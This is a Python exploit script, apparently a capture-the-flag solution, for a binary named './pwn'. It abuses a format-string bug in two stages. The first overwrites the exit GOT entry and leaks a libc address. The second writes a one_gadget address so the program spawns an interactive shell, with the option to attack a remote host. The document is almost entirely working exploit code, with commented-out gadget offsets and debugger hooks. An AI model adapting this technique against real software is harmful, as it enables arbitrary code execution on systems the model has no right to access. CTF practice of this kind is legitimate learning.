from mypwn import *
import subprocess
ru=lambda s:p.recvuntil(s)
rl=lambda :p.recvline()
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)
rn=lambda n:p.recvn(n)

def run(ip=None,port=None):
    global p,is_debug
    if libpath and binarypath:
        p=process(binarypath,env={'LD_PRELOAD':libpath})
    elif ip and port:
        is_debug=False
        p=remote(ip,port)
    else:
        p=process(binarypath)

def debugf(s=''):
    if is_debug:
        gdb.attach(p,s)

def exp(ip=None,port=None):
    run(ip=ip,port=port)
    def getchar():
        return subprocess.check_output('./rand',shell=True)
    c=getchar()
    ru('enter:')
    sl(c)
    ru('slogan: \x00')
    # debugf('b *0x4009DF\nb *0x4009CB')
    exit_got=0x601060
    exit_target=0x4009B2
    pay1=('%{}$p%{}c%12$n'+'\x00'*13+'{}').format(0x2b,exit_target-14,p64(exit_got))
    sd(pay1)
    libc=int(ru('bye')[0:14],16)
    libc_base=libc-0x20830
    print(hex(libc))
    one_off=0x45216
    # one_off=0x4526a
    # one_off=0xf02a4
    one_off=0xf1147
    # one_off=0xcd0f3
    # one_off=0xcd1c8
    # one_off=0xf02a4
    # one_off=0xf02b0
    # one_off=0xf66f0
    # import mypwn
    # mypwn.context.arch='amd64'
    pay=fmt_payload(9,writes={exit_got:libc_base+one_off},write_size='short')
    # debugf('b *0x4009e4')
    print(hex(0x601018),hex(libc_base+one_off))
    print(len(pay))
    print(pay)
    debugf('b *{}'.format(hex(libc_base+one_off)))
    
    sd(pay)
    p.interactive()

context(log_level='debug',os='linux',arch='amd64')
# context(log_level='debug',os='linux',arch='i386')
context.aslr=True
p=None
libpath=None
binarypath=['./pwn']
is_debug=True
exp()